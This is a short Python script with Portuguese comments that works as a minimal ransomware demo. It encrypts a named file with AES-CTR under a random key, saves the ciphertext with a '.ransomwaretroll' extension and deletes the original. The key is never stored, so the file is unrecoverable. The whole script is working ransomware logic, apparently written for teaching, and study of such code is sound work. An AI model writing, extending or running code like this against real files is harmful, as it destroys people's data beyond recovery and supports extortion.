import os  # Módulo para operações do sistema operacional, como manipulação de arquivos
import pyaes  # Módulo para criptografia AES (Advanced Encryption Standard)
import secrets  # Módulo para gerar dados seguros e aleatórios, como chaves criptográficas

# Gera uma chave de criptografia aleatória (16 bytes)
# A chave gerada aqui será usada para criptografar e descriptografar os dados
key = secrets.token_bytes(16)

# Nome do arquivo a ser criptografado (arquivo original)
file_name = "teste.txt"

# Tenta abrir e ler o arquivo
# O código tenta abrir o arquivo no modo binário de leitura ('rb') para obter seu conteúdo
try:
    with open(file_name, "rb") as file:
        file_data = file.read()  # Lê o conteúdo do arquivo (dados binários)
except FileNotFoundError:
    # Caso o arquivo não seja encontrado, um erro será exibido e o programa será encerrado
    print(f"Erro: O arquivo {file_name} não foi encontrado.")
    exit()  # Encerra a execução do programa

# Criptografa o arquivo com AES no modo CTR usando a chave gerada
# O modo CTR (Counter) permite criptografar os dados de maneira segura e eficiente
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)  # Aplica a criptografia ao conteúdo do arquivo

# Nome do arquivo criptografado
# O novo arquivo terá o mesmo nome do original com o sufixo ".ransomwaretroll"
# Isso indica que o arquivo foi criptografado e "sequestrado" por um ransomware
new_file = file_name + ".ransomwaretroll"

# Salva o arquivo criptografado em disco
# O arquivo criptografado é salvo com a extensão ".ransomwaretroll" para diferenciá-lo
with open(new_file, 'wb') as new_file:
    new_file.write(crypto_data)  # Escreve os dados criptografados no novo arquivo

# Remove o arquivo original após garantir que foi criptografado com sucesso
# A exclusão do arquivo original é feita para evitar que ele seja acessado sem a descriptografia
os.remove(file_name)

# Mensagem de sucesso indicando que o arquivo foi criptografado e salvo com sucesso
print(f"Arquivo criptografado com sucesso: {new_file}")
